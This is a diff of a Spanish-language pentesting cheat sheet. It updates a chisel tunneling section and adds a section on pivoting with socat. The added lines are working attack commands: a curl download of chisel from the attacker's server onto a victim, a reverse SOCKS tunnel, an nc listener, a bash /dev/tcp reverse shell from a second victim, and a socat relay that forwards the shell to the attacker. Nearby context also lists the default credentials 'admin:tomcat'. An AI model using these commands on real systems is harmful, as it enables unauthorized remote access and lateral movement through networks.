@@ -433,7 +433,21 @@ admin:tomcat
 ```shell
 - curl http://<ip>/chisel_linux_amd64 -o chisel <--- para descargar chisel en la victima con el servidor del atacante.
 - chmod +x chisel
-- ./chisel client <ip>:<puerto> R:socks 
+- ./chisel client <ip_servidor>:<puerto> R:socks 
+```
+### Uso de Socat
+#### Lado atacante
+```shell
+- nc -lvnp <puerto a la escucha>
+```
+#### Lado víctima
+Maquina victima 2
+```shell
+- sh -i >& /dev/tcp/<ip de máquina victima 1>/<puerto receptor de victima 1> 0>&1
+```
+Maquina victima 1
+```shell
+- ./socat tcp-l:<puerto receptor>,fork,reuseaddr tcp:<ip atacante>:<puerto a enviar de maquina atacante>
 ```
 <div align="left">
   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" height="39" alt="linux logo"  />
